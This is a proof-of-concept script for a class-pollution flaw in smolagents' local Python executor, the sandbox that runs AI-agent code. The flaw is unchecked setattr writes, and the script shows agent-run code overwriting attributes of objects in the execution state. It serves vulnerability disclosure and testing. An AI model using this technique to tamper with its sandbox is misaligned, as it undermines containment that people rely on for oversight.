# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_value (ast.Attribute branch)
# Type: get-attr-set-attr
#
# The setter `set_value` calls `setattr(obj, target.attr, value)` without
# checking if target.attr is a dunder. The getter `evaluate_attribute` blocks
# dunder reads, but `set_value` does not block dunder writes. This allows
# polluting any attribute (including dunders) on objects reachable via
# non-dunder paths from the execution state.

from smolagents.local_python_executor import evaluate_python_code

class Inner:
    value = "clean"

class Target:
    inner = Inner()

target = Target()

state = {"target": target}

def run_poc():
    code = "target.inner.value = 'pwnd'"
    evaluate_python_code(code, state=state, static_tools={}, custom_tools={}, authorized_imports=[])

def verify_poc():
    assert target.inner.value == "clean", "Pre-condition failed"
    run_poc()
    print(f"After: target.inner.value = {target.inner.value}")
    assert target.inner.value == "pwnd", "Class pollution failed!"
    print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
    verify_poc()
